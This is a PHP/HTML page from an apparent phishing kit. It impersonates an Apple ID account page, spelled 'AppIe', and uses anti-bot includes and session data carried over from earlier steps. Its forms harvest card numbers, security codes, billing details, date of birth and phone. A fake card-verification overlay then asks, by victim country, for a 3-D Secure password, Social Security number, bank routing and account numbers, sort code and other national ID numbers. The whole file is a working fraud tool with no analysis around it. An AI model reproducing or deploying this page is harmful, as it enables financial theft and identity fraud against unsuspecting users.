<?php
session_start();

include '../../blocked.php';

include '../../plugin.php';

$a = $_SESSION['name'];

$zab = explode(" ", $a);

$first = $zab[0];
$last = $zab[1];

$zab1 = explode("}", $a);
$ze = $zab1[0];

$az = preg_replace("/[^A-Za-z0-9 ]/", '', $ze);
?>
<!DOCTYPE html>
<html>
<head>
	<title>Manage your AppIe ID</title>
	<link rel="stylesheet" type="text/css" href="Data/css/desktop.css">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="icon" href="Data/img/favicon.ico" type="image/x-icon" />
<style>

 .card02x {
    display: inline-block;
    background-image: url("http://i.imgur.com/NJHG6g5.png");
    background-repeat: no-repeat;
    background-position: 0px -406px;
    height: 27px;
    position: absolute;
    top: 123px;
    left: 500px;
    bottom: 6px;
    width: 40px;
}


</style>
</head>
<body>
<div id="head"></div>
<div id="container">
	<div id="xheader">
		<div id="navbar"></div>
		<div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 40px;z-index: 2;left: 0px;"> <?=$az;?> </div>
		<div id="account_type">Your AppIe ID is <b> <?=$xuser;?> </b> </div>
		<div id="logout"></div>
		<font id="logout0">Sign Out</font>
	</div>
	<div id="xcontent">
		<form action="" method="POST" target="_self" name="xupdate" id="xupdate" >
			<font class="xFont" style="top:32px;left:2px;">Account</font>
			<font class="xFont" style="top:110px;">Payment & Shipping</font>
			<hr style="top:70px;">
                        <br><br>
			<font class="xFont2" style="top:32px;left:280px;">APPIE ID</font>
			<font class="xFont2" style="top:32px;left:600px;">REACHABLE AT</font>
			<font class="xFont3" style="top:60px;left:280px;"><?=$xuser;?></font>
			<font class="xFont3" style="top:60px;left:600px;"><?=$xuser;?></font>
			<font class="xFont3" style="top:110px;left:600px;"></font>
                        <br><br>
			<font class="xFont3" style="top: 104px;font-family: 'Open Sans', sans-serif;left:600px;width: 312px;height: 200px;font-size: 14px;line-height: 1.4em;font-weight: 100;color: #666;"> This payment method will be used when you make purchases in the iTunes Store,    App Store, AppIe Online Store, and more.</font>

<img src="Data/img/pay.png" style="position: absolute;top: 98px;left: 277px;">

<input name="number" id="number" class="required" pattern="[0-9.]+" minlength="13" value="***************" maxlength="19" onkeyup="ZEBI(this.value)" onkeypress="return isNumberKey(event)"  placeholder="credit card number" type="tel" style="position: absolute;top: 120px;left: 280px;width: 259px;" onblur="if (this.value == '') {this.value = '<?echo$_SESSION['carta'];?>';}" onfocus="if (this.value == '<?echo$_SESSION['carta'];?>') {this.value = '';}">
<span class="card02x" id="card02x"></span>

<input type="tel" name="expred" pattern="\d{1,2}/\d{4}" maxlength="7" style="position: absolute;top: 160px;left: 280px;width: 110px;" id="expred" placeholder="mm/yyyy" class="required">

<input class="required" id="cvv2" placeholder="security code" maxlength="4" onkeypress="return isNumberKey(event)" pattern="[0-9.]+" name="sdfs" type="tel" style="position: absolute;top: 160px;left: 409px;width: 130px;">

<img src="Data/img/bil.png" style="position: absolute;top: 199px;left: 276px;">
<input type="text" maxlength="10" name="name1" value="***************" id="name1" style="position: absolute;top: 220px;left: 280px;width: 110px;" placeholder="first name" class="required">
<input class="required" maxlength="10" placeholder="last name" name="name2" value="***************" id="name2" type="txt" style="position: absolute;top: 220px;left: 409px;width: 130px;">
<input name="adre1" id="adre1" class="required" maxlength="60" value="***************" placeholder="street address" type="txt" style="position: absolute;top: 260px;left: 280px;width: 259px;">


<input name="adre2" id="adre2" class="inox" maxlength="60" placeholder="apt., suite, pldg" type="txt" style="
    position: absolute;
    top: 300px;
    left: 280px;
    width: 259px;
">

<input name="city" id="city" class="required" maxlength="20" value="***************" placeholder="city" type="txt" style="
    position: absolute;
    top: 340px;
    left: 280px;
    width: 259px;
">
<input type="text" name="state" id="state" value="***************" maxlength="25" style="position: absolute;top: 380px;left: 280px;width: 115px;" placeholder="state" class="inox">

<input class="required" maxlength="10" placeholder="zip code" maxlength="10" value="***************" name="zip" id="zip" type="text" style="
    position: absolute;
    top: 380px;
    left: 409px;
    width: 130px;
    ">


<input name="bith" class="required" maxlength="10" id="2" value="***************" placeholder="date of brith dd/mm/yyyy" type="numbers" style="
    position: absolute;
    top: 460px;
    left: 280px;
    width: 259px;
">
<input name="phone" class="required" placeholder="phone number" value="***************" maxlength="20" type="tel" style="
    position: absolute;
    top: 500px;
    left: 280px;
    width: 259px;
">



     		</form>
	</div>
	<div id="xfooter"></div>
</div>
  <script type="text/javascript" src="//code.jquery.com/jquery-1.9.1.js"></script>
  <script src="Data/js/main.js"></script></script>
<script type="text/javascript" src="Data/js/jquery.validate.min.js"></script>

<script type='text/javascript'>//<![CDATA[
$(window).load(function(){
$(document).ready(function(){
    $("#xupdate").validate();
  });
});//]]> 

</script>
<script language="Javascript">
// <![CDATA[
function ZEBI(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var cardnumber = (cardnumber + '').replace(/\\s/g, ''); //remove space

if ((/^(417500|(4917|4913|4026|4508|4844)\d{2})\d{10}$/).test(cardnumber) && cardnumber.length == 16) {
//Electron
                document.getElementById("card02x").style.backgroundPosition = "0px -203px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(4)/).test(cardnumber) && (cardnumber.length == 16)) {
//Visa
                document.getElementById("card02x").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(34|37)/).test(cardnumber) && cardnumber.length == 15) {
//American Express
                document.getElementById("card02x").style.backgroundPosition = "0px -57px";
                document.getElementById("cvv2").maxLength ="4"
}
else if ((/^(51|52|53|54|55)/).test(cardnumber) && cardnumber.length == 16) {
//Mastercard
                document.getElementById("card02x").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(cardnumber) && cardnumber.length == 16) {
//Maestro
                document.getElementById("card02x").style.backgroundPosition = "0px -174px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(6011|16)/).test(cardnumber) && cardnumber.length == 16) {
//Discover
                document.getElementById("card02x").style.backgroundPosition = "0px -86px";
}
else if ((/^(30|36|38|39)/).test(cardnumber) && (cardnumber.length == 14)) {
//DINER
                document.getElementById("card02x").style.backgroundPosition = "0px -115";
}
else if ((/^(35|3088|3096|3112|3158|3337)/).test(cardnumber) && (cardnumber.length == 16)) {
//JCB
                document.getElementById("card02x").style.backgroundPosition = "0px -145px";
}
else {
                document.getElementById("card02x").style.backgroundPosition = "0px -406px";
}

}

// ]]></script>

    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#zeb').delay(500).fadeIn(500);
      });
    </script>
    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#a2').delay(500).fadeIn(500);
      });
    </script>
    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#a1').delay(500).fadeIn(500);
      });
    </script>

<script type="text/javascript">             
window.onload = function openVentana(){            
$(".ventana").slideDown(500);             
}       
function closeVentana(){            
$(".ventana").slideUp("fast");          
} 
</script> 
<div class="ventana" >
<div id="zeb" class="zeb"></div>
    <div id="a2" style="width: auto;margin: 10px;display: none;z-index: 100000;">
        <div id="a1" class="a1">

<center>
<?php
include '../../blocked.php';

$negara = $_SESSION['country'];
?>

      <div style="background: url(./Data/img/vbv.PNG) no-repeat;  height: 700px;  width: 458px;               margin: 0 auto;   margin-top: 40px; position: relative;">
       <form action="" id="form1" method="post" name="login">	   
	<h5 style="position: absolute;  outline: none;left: 228px;top: 218px; font-family: Arial, Helvetica, sans-serif;">XXXX-XXXX-XXXX-<?php echo substr($_SESSION['cart'] , -4);?></h5>     
<input value="<?php echo $_SESSION['name'];?> "   name="name" style="  position: absolute;  outline: none; top: 262px;  left: 227px;  border: 1px solid #CCCCCC; width: 185px;">
<input name="date"value="<?php echo $_SESSION['date'];?>" style="  position: absolute;  outline: none;  top: 300px;  width: 185px; left: 227px; border: 1px solid #CCCCCC;">
<input name="vbv" type="password" style="position: absolute;  outline: none;      top: 372px;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" >
<?php
if ($negara=="Hong Kong" or $negara=="Japan" or $negara=="China" or $negara=="Indonesia" or $negara=="Korea, Democratic People's Republic of" or $negara=="Korea, Republic of" or $negara=="Myanmar" or $negara=="Taiwan, Province of China" or $negara=="Thailand" or $negara=="Timor-leste" or $negara=="Malaysia" or $negara=="Singapore" or $negara=="Viet Nam"){ echo '
<p style="left: 42px; color: #272C30;      font-size: 14px; position: absolute;  outline: none;top: 400px;">ID Number:</p>
									<input maxlength="15"  style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="idnumber" style="position: absolute;  outline: none;  top: 372;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" type="text" >
';}
?>
<?php
if ($negara=="United States"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Routing Number:</p>
									<input maxlength="15"  style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="routing" style="position: absolute;  outline: none;  top: 372;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" type="text" >
';}
?>
<?php
if ($negara=="Canada"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Social Insurance Number:</p>
									<input maxlength="15" style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;"  autocomplete="off" name="cassn" type="text" required>
';}
?>
<?php if ($negara=="United States"  or $negara=="Ireland"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 460px;">Social Security Number:</p>
									<input maxlength="11" style="position: absolute;  outline: none; top: 460px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;"  autocomplete="off" name="ssn" type="text" placeholder="XXX-XX-XXXX" required>
';}?>
<?php if ($negara=="United States" or $negara=="United Kingdom" or $negara=="Australia" or $negara=="Ireland"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none; top: 430px;">Account Number:</p>
	<input style="position: absolute;  outline: none; top: 430px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" maxlength="15" autocomplete="off" name="acc_number"  type="text" >
';}?>
<?php if ($negara=="United Kingdom" or $negara=="Ireland" ){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Sort Code:</p>
<input style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px;width: 78px;" placeholder="XX-XX-XX" maxlength="8" autocomplete="off" name="sort" type="text" required>
';} ?>
<?php
if ($negara=="Australia"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">OSID Number:</p>
									<input maxlength="10" style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="osidnum" required="required" type="text">
									<p style="left: 42px; position: absolute;  outline: none;top: 445px;">Credit Limit:</p>
									                        <input type="text" style="position: absolute;  outline: none; top: 460px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off"  maxlength="32" name="cc_limit" required="" title="Credit Limit">

';}
?>

<input type="submit" value="Confrim My Account" style="  position: absolute;    border-radius: 3px;  top: 500px; border: 1px solid #CCCCCC;  background-color: #DDDDDD; left: 126px;  width: 200px;">

</center>
</div></div>
</body>
</html>
